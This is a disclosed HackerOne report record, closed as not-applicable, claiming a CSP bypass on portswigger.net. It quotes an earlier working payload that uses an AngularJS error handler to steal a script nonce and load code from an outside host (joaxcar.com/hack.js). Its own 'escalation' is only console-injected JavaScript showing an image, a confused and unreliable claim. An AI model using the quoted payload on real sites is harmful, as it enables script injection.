---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2387458'
original_report_id: '2387458'
title: CSP Bypass and escalation of https://hackerone.com/reports/2279346
weakness: Business Logic Errors
team_handle: portswigger
created_at: '2024-02-23T05:22:00.899Z'
disclosed_at: '2024-02-23T15:39:07.043Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 38
asset_identifier: portswigger.net
asset_type: URL
max_severity: critical
tags:
- hackerone
- business-logic-errors
---

# CSP Bypass and escalation of https://hackerone.com/reports/2279346

## Metadata

- HackerOne Report ID: 2387458
- Weakness: Business Logic Errors
- Program: portswigger
- Disclosed At: 2024-02-23T15:39:07.043Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Hello Team , 

I have gone through this report https://hackerone.com/reports/2279346 and their is CSP bypass where website has implemented security in that but after this i can escalate Again CSP bypass with using different Script .

As shown in https://hackerone.com/reports/2279346 report website rectify the scripts like: 

document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//joaxcar.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`


But their is new way where i can escalate the bug with new script which is : 

var demo=document.createElement("img");
demo.src="https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"; 
document.body.innerHTML="";demo.width="1000"; demo.height="1000";
document.body.appendChild(demo);

F3074920


Steps: 
Go to https://portswigger.net/
Inject the script in console tab and see the impact

In this website configuration on CSP header is not proper . In my attachment their is no header for img in CSP . So attacker can escalate the bug again with different scripts.
F3074919

Thanks 
Priyanshu

## Impact

Escalate the bug with new script

CSP bypass using img script.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
